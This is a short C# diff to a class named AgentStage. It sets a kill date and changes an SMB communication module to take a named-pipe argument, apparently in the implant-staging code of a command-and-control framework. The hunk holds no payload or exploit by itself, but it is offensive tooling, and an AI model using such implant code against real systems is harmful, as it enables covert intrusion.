@@ -43,7 +43,7 @@ public class AgentStage
         var config = new ConfigController();
         config.SetOption(ConfigSetting.KillDate, killDate);
 
-        var commModule = new SmbCommModule();
+        var commModule = new SmbCommModule(pipeName);
 
         StartAgent(config, commModule);
     }
